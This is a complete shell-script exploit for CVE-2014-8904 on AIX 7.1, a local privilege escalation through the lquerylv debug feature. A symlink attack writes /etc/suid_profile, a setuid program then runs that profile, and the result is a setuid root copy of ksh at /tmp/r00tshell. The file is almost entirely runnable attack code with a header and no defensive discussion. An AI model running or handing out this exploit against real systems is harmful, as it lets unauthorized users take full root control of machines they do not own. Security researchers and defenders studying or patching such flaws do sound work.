#!/bin/sh
#
# Exploit Title: AIX 7.1 lquerylv privilege escalation
# Date: 2015.10.30
# Exploit Author: S2 Crew [Hungary]
# Vendor Homepage: www.ibm.com
# Software Link: -
# Version: -
# Tested on: AIX 7.1 (7100-02-03-1334)
# CVE : CVE-2014-8904
#
# From file writing to command execution ;)
#
export _DBGCMD_LQUERYLV=1
umask 0
ln -s /etc/suid_profile /tmp/DEBUGCMD
/usr/sbin/lquerylv

cat << EOF >/etc/suid_profile
cp /bin/ksh /tmp/r00tshell
/usr/bin/syscall setreuid 0 0
chown root:system /tmp/r00tshell
chmod 6755 /tmp/r00tshell
EOF

/opt/IBMinvscout/bin/invscoutClient_VPD_Survey # suid_profile because uid!=euid
/tmp/r00tshell